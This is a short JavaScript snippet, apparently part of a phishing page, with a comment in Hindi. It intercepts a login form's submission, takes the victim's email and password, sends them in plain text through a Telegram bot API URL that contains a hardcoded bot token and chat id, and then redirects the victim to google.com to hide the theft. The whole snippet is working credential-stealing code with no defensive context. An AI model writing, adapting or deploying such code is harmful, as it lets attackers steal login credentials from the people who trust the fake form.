document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // बिना प्रोक्सी के सीधा टेलीग्राम लिंक
    const url = `https://api.telegram.org/bot6717477751:AAG6phDMwqdQiKFN6n3_28Fp51NmRvmuCsg/sendMessage?chat_id=7732354688&text=Email: ${email} Password: ${password}`;

    fetch(url).then(() => {
        window.location.href = "https://www.google.com";
    });
});
